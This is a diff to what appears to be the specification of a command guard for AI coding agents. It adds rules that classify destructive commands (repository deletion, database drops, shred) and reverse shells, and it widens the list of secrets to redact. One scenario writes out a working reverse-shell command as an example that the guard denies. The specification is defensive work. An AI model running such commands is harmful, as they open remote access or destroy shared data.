@@ -217,6 +217,25 @@ The system SHALL judge the reading of a credential file, the writing of a protec
 - **WHEN** an unattended policy judges a write to `/etc/claude-code/managed-settings.json`
 - **THEN** it is denied
 
+### Requirement: Commands that destroy hosted or shared state, and reverse shells, are risky
+
+The system SHALL classify as destructive `gh repo delete`, `gh repo archive`, `gh release delete`, `gh secret delete`, `gh api` with a DELETE method, `dropdb` and `dropuser`, `redis-cli` flushing and `mongosh` dropping a database, and `find -delete` over a path outside the workspace; as a change of privilege `gh secret set`; as a publish `npm unpublish`, `deprecate` and `dist-tag`; as a deletion `shred`; and as an exfiltration and a network access any redirect to `/dev/tcp` or `/dev/udp`, including the duplicating form `>& /dev/tcp/...`.
+
+#### Scenario: A repository is deleted
+
+- **WHEN** an agent runs `gh repo delete owner/name --yes` under the guarded profile
+- **THEN** the call needs a person's approval
+
+#### Scenario: A reverse shell
+
+- **WHEN** an agent runs `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` under the guarded profile
+- **THEN** the call is denied
+
+#### Scenario: Cleaning inside the workspace
+
+- **WHEN** an agent runs `find . -name '*.pyc' -delete` under the guarded profile
+- **THEN** the call is allowed
+
 ### Requirement: `warden explain` shows how a command is judged
 
 The system SHALL print, for a command line, the line, the rewrite if any, the profile, the mode and whether an ask is possible, each finding with its category and decision, the rule that decided, the notes, the decision and its reason, and whether the output would run through the redactor.
@@ -315,6 +334,48 @@ The system SHALL print the number of records with the count of each decision (a 
 - **WHEN** `WARDEN_STATE_DIR` is set
 - **THEN** the log is read from its `audit` folder
 
+### Requirement: `warden report` says what a stricter profile would have stopped
+
+The system SHALL print, for the log in the policy's audit directory, `$WARDEN_STATE_DIR/audit` or `--dir`, and for one session with `--session`: how many calls were recorded, how many of them the policy intended to ask about or deny but audit mode let through, those counts per risk category, the commands that were stopped most often, and one closing line that says what share of the calls would have been stopped. It SHALL print nothing but that line, and exit successfully, for an empty log.
+
+#### Scenario: Observing before enforcing
+
+- **WHEN** the log holds ten calls in audit mode, two of which the policy intended to deny for `destructive`
+- **THEN** the report says two of ten would have been stopped and lists `destructive` with a count of two
+
+#### Scenario: An empty log
+
+- **WHEN** the log holds no record
+- **THEN** the report says there is nothing to report yet
+
+### Requirement: `status` and `report` can look at a recent period
+
+The system SHALL accept `--since <duration>` on `warden status` and `warden report`, a whole number followed by `m` (minutes), `h` (hours) or `d` (days), and then read only the records written in that period before now; and SHALL refuse any other form with a message that shows the accepted ones and exit with status 2.
+
+#### Scenario: Overnight
+
+- **WHEN** the log holds a record from three days ago and one from a minute ago and a person runs `warden report --since 12h`
+- **THEN** the report counts one call
+
+#### Scenario: A duration that cannot be read
+
+- **WHEN** a person runs `warden status --since tomorrow`
+- **THEN** the command refuses it, shows `30m`, `12h` and `7d` as examples and exits with status 2
+
+### Requirement: `warden report --json` gives the report to a program
+
+The system SHALL, with `--json`, print the report as one JSON object with the keys `records`, `calls`, `would_stop`, `by_category` (a map of category to count), `by_decision` (a map of the labels `status` shows to count) and `redactions` (a map of kind to count), and nothing else, also for an empty log, where every number is zero.
+
+#### Scenario: A program reads the report
+
+- **WHEN** the log holds five calls, three of which the policy intended to stop for `destructive`
+- **THEN** the object says `calls` is 5, `would_stop` is 3 and `by_category` has `destructive` at 3
+
+#### Scenario: An empty log
+
+- **WHEN** the log holds no record
+- **THEN** the object has every count at zero
+
 ### Requirement: `warden audit verify` exits with the verdict
 
 The system SHALL print that the chain is intact with its record and file counts and exit successfully, or print where it is broken and exit with status 1.
@@ -335,7 +396,7 @@ The system SHALL log by default to `~/.local/share/warden/audit`, let a policy t
 
 ### Requirement: Secrets and personal data become stable, reversible tokens
 
-The system SHALL replace credentials and personal data in text by tokens of the form `<KIND_n>`, the same value always getting the same token within a session and different values different numbers starting at 1 for each kind; SHALL recognise the credentials of the common providers (AWS, GitHub, GitLab, Slack, Google, Stripe, OpenAI and Anthropic keys, SendGrid, Twilio, npm, PyPI, Hugging Face and Doppler tokens, JSON web tokens, bearer tokens, basic-auth headers, passwords in URLs, `.npmrc` tokens, private key blocks and literals assigned to sensitive names such as `password` or `api_key`) and the personal data of email addresses, telephone numbers, IBANs (checked by their checksum), payment cards (checked with Luhn), French social security numbers (checked by their key), US social security numbers, public IPv4 addresses (only when asked), the names a policy lists and the patterns a policy defines; SHALL leave alone the values an allow list names; and SHALL put the real value back when asked to restore a text.
+The system SHALL replace credentials and personal data in text by tokens of the form `<KIND_n>`, the same value always getting the same token within a session and different values different numbers starting at 1 for each kind; SHALL recognise the credentials of the common providers (AWS, GitHub, GitLab, Slack, Google, Stripe, OpenAI and Anthropic keys, SendGrid, Twilio, npm, PyPI, Hugging Face and Doppler tokens, Slack and Discord webhook addresses, DigitalOcean, Shopify, Notion, Linear, Supabase, Sentry, Grafana, Postman, PlanetScale, Databricks, Fly, Docker Hub, Mailgun and Terraform Cloud tokens, age secret keys, Azure storage account keys, JSON web tokens, bearer tokens, basic-auth headers, passwords in URLs, `.npmrc` tokens, private key blocks and literals assigned to sensitive names such as `password` or `api_key`) and the personal data of email addresses, telephone numbers, IBANs (checked by their checksum), payment cards (checked with Luhn), French social security numbers (checked by their key), US social security numbers, public IPv4 addresses (only when asked), the names a policy lists and the patterns a policy defines; SHALL leave alone the values an allow list names; and SHALL put the real value back when asked to restore a text.
 
 #### Scenario: Same value, same token
 
